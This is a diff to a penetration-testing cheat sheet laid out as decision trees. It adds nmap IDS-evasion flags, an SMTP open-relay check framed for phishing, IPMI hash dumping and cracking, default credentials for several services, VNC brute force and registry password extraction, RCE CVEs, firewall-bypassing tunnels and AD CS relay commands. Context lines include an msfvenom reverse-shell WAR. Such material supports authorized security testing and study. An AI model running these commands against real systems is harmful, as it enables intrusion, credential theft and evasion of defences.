@@ -106,7 +106,19 @@ LIVE HOST IDENTIFIED
   │
   └─► STEP 3: UDP Scan (if TCP yields little)
         sudo nmap -sU -top-ports=100 <IP> -oA udp_scan
-        (Look for: SNMP 161, DNS 53, TFTP 69)
+        (Look for: SNMP 161, DNS 53, TFTP 69, LDAP 389, IPMI 623)
+
+### 1D: Nmap Firewall/IDS Evasion
+
+```
+NMAP SCAN BLOCKED OR INCOMPLETE? TRY EVASION:
+  ├─► Fragment packets: nmap -f <IP> (8-byte) or nmap -ff <IP> (16-byte)
+  ├─► Decoy scan: nmap -D RND:10 <IP>
+  ├─► Spoof source port: nmap --source-port 53 <IP> (DNS often allowed)
+  ├─► Adjust timing: nmap -T1 <IP> (sneaky) or nmap --scan-delay 1s <IP>
+  ├─► Idle/Zombie scan: nmap -sI <zombie_host> <IP>
+  ├─► Data length: nmap --data-length 25 <IP>
+  └─► Combine: nmap -f -D RND:5 --source-port 53 --data-length 25 -T2 <IP>
 ```
 
 ### 1C: Service-by-Service Enumeration Decision Tree
@@ -169,6 +181,12 @@ PORT 25/110/143/993/995 (MAIL SERVICES)
   │
   ├─► Check for credentials in other services
   │
+  ├─► Open Relay Check
+  │     telnet <IP> 25
+  │     MAIL FROM: test@test.com → RCPT TO: target@external.com
+  │     └── If 250 OK ──► Open relay! Can send phishing emails
+  │           swaks --from test@test.com --to target@external.com --server <IP>
+  │
   └─► Phishing potential (if in scope)
 
 ═══════════════════════════════════════════════════════════════
@@ -187,8 +205,41 @@ PORT 53 (DNS)
   │     dig txt <domain>  (SPF, verification records)
   │     dig mx <domain>
   │
+  ├─► Certificate Transparency logs
+  │     https://crt.sh/?q=<domain>
+  │     └── Find subdomains, internal hostnames, email addresses
+  │
+  ├─► AD DNS enumeration (if authenticated)
+  │     adidnsdump -u <domain>\\user -p <pass> <DC_IP>
+  │
   └─► Subdomain brute force
         dnsenum --enum <domain> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+
+═══════════════════════════════════════════════════════════════
+PORT 623 (IPMI)
+═══════════════════════════════════════════════════════════════
+  │
+  ├─► Version detection: nmap -sU -p 623 --script ipmi-version <IP>
+  ├─► Dump hashes (RAKP flaw): msf> use auxiliary/scanner/ipmi/ipmi_dumphashes
+  │     └── Crack: hashcat -m 7300 ipmi_hashes.txt rockyou.txt
+  └─► Default creds: ADMIN:ADMIN, root:root, admin:admin
+
+═══════════════════════════════════════════════════════════════
+PORT 1521 (Oracle TNS)
+═══════════════════════════════════════════════════════════════
+  │
+  ├─► Enumerate SID: ./odat.py sidguesser -s <IP> -p 1521
+  ├─► Default creds: scott:tiger, system:oracle
+  ├─► With creds ──► ODAT toolkit for file upload/RCE/SMB relay
+  └─► git clone https://github.com/quentinhardy/odat.git
+
+═══════════════════════════════════════════════════════════════
+PORT 5900 (VNC)
+═══════════════════════════════════════════════════════════════
+  │
+  ├─► Default/weak creds: password:password, password:123456
+  ├─► Brute force: hydra -P wordlist vnc://<IP>
+  └─► Windows registry: reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password
 
 ═══════════════════════════════════════════════════════════════
 PORT 80/443/8080/8443 (WEB) ──► See Web Attack Decision Tree below
@@ -512,6 +563,22 @@ WEB APPLICATION FOUND (Port 80/443/8080/etc.)
               │     ├── /manager/html access? ──► Deploy WAR file
               │     └── msfvenom -p java/jsp_shell_reverse_tcp -f war -o shell.war
               │
+              ├── ColdFusion ──►
+              │     ├── Default creds: admin:admin
+              │     ├── Check CFIDE/administrator/index.cfm
+              │     ├── Directory Traversal (CVE-2010-2861)
+              │     └── RCE via FCKeditor (CVE-2009-2265)
+              │
+              ├── Splunk ──►
+              │     ├── Default creds: admin:changeme
+              │     ├── Admin access? ──► Create custom app for RCE!
+              │     └── SSRF (CVE-2018-11409)
+              │
+              ├── osTicket ──►
+              │     ├── Default creds: ostadmin:admin
+              │     ├── Register with company email → access other services
+              │     └── Support tickets may contain sensitive info
+              │
               └── Other ──► Searchsploit <app_name> <version>
 ```
 
@@ -825,7 +892,21 @@ ROOT/SYSTEM ACCESS OBTAINED ON ONE HOST
   │           secretsdump.py <domain>/<admin>:<pass>@<DC_IP>
   │           └── Dump ALL domain hashes!
   │
-  └─► STEP 5: For each new host ──► Go back to Phase 1
+  ├─► STEP 5: Advanced Pivoting Tools
+  │     ├── Ligolo-ng: Full TUN access without proxychains
+  │     ├── rpivot: Reverse SOCKS via HTTP (bypasses egress filtering)
+  │     ├── dnscat2: DNS tunneling (bypasses strict firewalls)
+  │     ├── ptunnel-ng: ICMP tunneling (when only ping allowed)
+  │     └── Socat: Port forwarding / encrypted tunnels
+  │
+  ├─► STEP 6: AD CS (Certificate Services) Attacks
+  │     ├── Check: certipy find -u <user>@<domain> -p <pass> -dc-ip <DC_IP>
+  │     ├── ESC1: Misconfigured templates (SAN + Client Auth)
+  │     ├── ESC4: Vulnerable template ACL
+  │     └── PetitPotam + AD CS Relay:
+  │           ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp --adcs
+  │
+  └─► STEP 7: For each new host ──► Go back to Phase 1
         (Enumeration is ITERATIVE!)
 ```
 
@@ -881,8 +962,12 @@ ASSESSMENT COMPLETE
 | 1433 | MSSQL | `mssqlclient.py` | xp_cmdshell, credentials |
 | 3306 | MySQL | `mysql -u root -p` | INTO OUTFILE, credentials |
 | 3389 | RDP | `xfreerdp /v:<IP>` | Credential attacks, BlueKeep |
+| 623 | IPMI | `nmap -sU -p 623 --script ipmi-version` | Hash dump (RAKP flaw), default creds |
+| 1521 | Oracle TNS | `./odat.py tnscmd -s <IP>` | SID guess, default creds, ODAT RCE |
+| 5432 | PostgreSQL | `psql -U postgres -h <IP>` | COPY RCE, read files, credentials |
+| 5900 | VNC | `nc -nv <IP> 5900` | Default creds, brute force, registry password |
 | 5985/5986 | WinRM | `evil-winrm -i <IP>` | Credential attacks |
-| 8080/8443 | HTTP alt | Same as port 80 | Tomcat manager, Jenkins, etc. |
+| 8080/8443 | HTTP alt | Same as port 80 | Tomcat, Jenkins, GitLab, ColdFusion, Splunk |
 
 ---
 
